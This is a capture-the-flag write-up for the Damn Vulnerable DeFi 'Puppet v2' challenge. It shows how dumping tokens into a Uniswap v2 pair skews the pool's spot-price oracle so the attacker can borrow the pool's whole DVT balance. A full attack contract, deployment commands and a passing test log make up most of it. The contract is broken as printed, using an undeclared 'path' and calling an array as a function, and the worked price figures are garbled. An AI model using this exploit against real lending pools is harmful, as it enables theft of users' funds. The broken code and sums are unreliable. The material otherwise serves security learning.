<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/9.png">

# Target Contract Review

Given contract.

**PuppetV2Pool.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

/**
 * @title PuppetV2Pool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetV2Pool {
    using SafeMath for uint256;

    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;

    mapping(address => uint256) public deposits;

    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);

    constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress)
        public
    {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
     * @notice Allows borrowing tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        // Calculate how much WETH the user must deposit
        uint256 amount = calculateDepositOfWETHRequired(borrowAmount);

        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), amount);

        // internal accounting
        deposits[msg.sender] += amount;

        require(_token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        uint256 depositFactor = 3;
        return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether);
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
    }
}
```
The `PuppetV2Pool` contract is a smart contract that allows users to borrow tokens by **depositing three times the value in WETH (Wrapped Ether)**.

**The contract uses the Uniswap v2 protocol to calculate the required amount of WETH to be deposited based on the desired borrow amount. The contract assumes that WETH and the borrowed token have the same amount of decimals.**

`borrow()` : Allows users to borrow tokens by first depositing three times the value in WETH. The function transfers the required amount of WETH from the sender to the contract and updates the internal accounting of deposits. It then transfers the borrowed tokens from the contract to the sender.

`calculateDepositOfWETHRequired()` : Calculates the amount of WETH required to be deposited based on the desired token amount. It uses the Uniswap v2 library to fetch the reserves of WETH and the borrowed token from the Uniswap pair and calculates the quote using the reserves.

`_getOracleQuote()` : Fetches the price from Uniswap v2 using the official UniswapV2Library. It retrieves the reserves of WETH and the borrowed token from the Uniswap pair and calculates the quote for the given amount.


Challenge's message:

> The developers of the previous pool seem to have learned the lesson. And released a new version!
Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.

# Subverting

In this particular challenge, there exists a paired contract (liquidity pool) connecting WETH and DVT tokens, which PuppetV2 utilizes to ascertain the price of DVT tokens when a user initiates the `borrow()` function. This determination is made by calculating the necessary WETH deposit through a call to `UniswapV2Library`.


```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
    UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
}
```

You can find the **mathematical calculations for determining the cost of an asset in the UniswapV2 liquidity pool** contract within the `quote()` function of the UniswapV2Library contract. Here is the `quote()` function:

```solidity
// given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
    require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
    require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
    amountB = amountA.mul(reserveB) / reserveA;
}
```

When we translate this function to meaningful form, we get the following:

```solidity
uint256 cost = _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether); // For all DVTs in the Pool
uint256 requriedWETH = UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);

// cost = 1.000.000 * (10e18 / 100e18) = 100.000e18
// requiredWETH = cost * 3 = 300.000 WETH
```

Similar to the previous "Puppet" level, the vulnerability in this challenge **stems from an individual's capacity to significantly alter the price of an asset**. In this case, **the attacker, armed with a substantial number of DVT tokens, can manipulate the price of DVT by executing swaps on the Uniswap exchange, specifically in the DVT/WETH trading pair**. To **devalue the price**, the attacker must augment the DVT amount while decreasing the WETH quantity within the liquidity pool.

If we employ the attacker's 10,000 DVT tokens and exchange them for WETH through the Uniswap pair contract, it will result in an increase in the DVT token quantity (from 100 to 10,100) and a decrease in the amount of WETH (from 10 to 0.0993...). This alteration will impact the ratio between them and substantially modify the cost of DVT, as follows:


```solidity
uint256 newCost = 1000000 * (0,0993.. / 10100e18) = 9.8321..
uint256 newRequiredWETH = newCost * 3 = 29,4964.. WETH
```





```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function deposit() external payable;
}

interface IPuppetV2Pool{
     function borrow(uint256 borrowAmount) external ;
}

contract AttackPuppetV2 {
    using SafeMath for uint256;

    IPuppetV2Pool  pool;
    IERC20  token;
    IERC20  weth;
    IUniswapV2Router02  uniswap;

    constructor(address _pool,address _weth,address _token,address _uniswap) public {
        pool = IPuppetV2Pool(_pool);
        weth = IERC20(_weth);
        token = IERC20(_token);
        uniswap = IUniswapV2Router02(_uniswap);
    }

    function attack() public payable {
        uint256 tokenAmount = token.balanceOf(address(this));
        token.approve(address(uniswap), tokenAmount);
        address[] memory arr = new address[](2);
        path[0] = arr(token);
        path[1] = arr(weth);
        uniswap.swapExactTokensForETH(tokenAmount,1,arr,address(this),uint256(block.timestamp *2));
        weth.deposit{value: address(this).balance}();
        uint256 ethAmount = weth.balanceOf(address(this));
        weth.approve(address(pool), ethAmount);
        uint256 poolTokenAmount = token.balanceOf(address(pool));
        pool.borrow(poolTokenAmount);
        uint256 borrowTokenAmount = token.balanceOf(address(this));
        token.transfer(msg.sender, borrowTokenAmount);
    }

    receive() external payable {}
}
```

First of all, the contract will get instances of contracts in the constructor as usual.

```solidity
constructor(address _pool,address _weth,address _token,address _uniswap) public {
    pool = IPuppetV2Pool(_pool);
    weth = IERC20(_weth);
    token = IERC20(_token);
    uniswap = IUniswapV2Router02(_uniswap);
}
```

In the `attack()` function, we will approve all player's DVT balance to `UniswapRouter` contract.

```solidity
uint256 tokenAmount = token.balanceOf(address(this));
token.approve(address(uniswap), tokenAmount);
```

Then, we will **swap all DVT tokens with WETH** using the `UniswapRouter` contract.

```solidity
address[] memory arr = new address[](2);
path[0] = arr(token);
path[1] = arr(weth);
uniswap.swapExactTokensForETH(tokenAmount,1,arr,address(this),uint256(block.timestamp *2));
```

After that, our attack contract will get the extra WETH needed by interacting with `WETH9` contract.

```solidity
weth.deposit{value: address(this).balance}();
```

```solidity
uint256 ethAmount = weth.balanceOf(address(this));
weth.approve(address(pool), ethAmount);
```

```solidity
uint256 poolTokenAmount = token.balanceOf(address(pool));
pool.borrow(poolTokenAmount);
```

```solidity
uint256 borrowTokenAmount = token.balanceOf(address(this));
token.transfer(msg.sender, borrowTokenAmount);
```
Here are the attacker commands:
```js
const attackFoctory = await ethers.getContractFactory("AttackPuppetV2", player);
const attack = await attackFoctory.deploy(lendingPool.address,weth.address,token.address,uniswapRouter.address);
await token.connect(player).transfer(attack.address, PLAYER_INITIAL_TOKEN_BALANCE);
await attack.connect(player).attack({value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n});
```

Solve the challenge.

```powershell

  [Challenge] Puppet v2
    ✔ Execution (88ms)


  1 passing (2s)

Done in 3.50s.
```

**_by wasny0ps_**

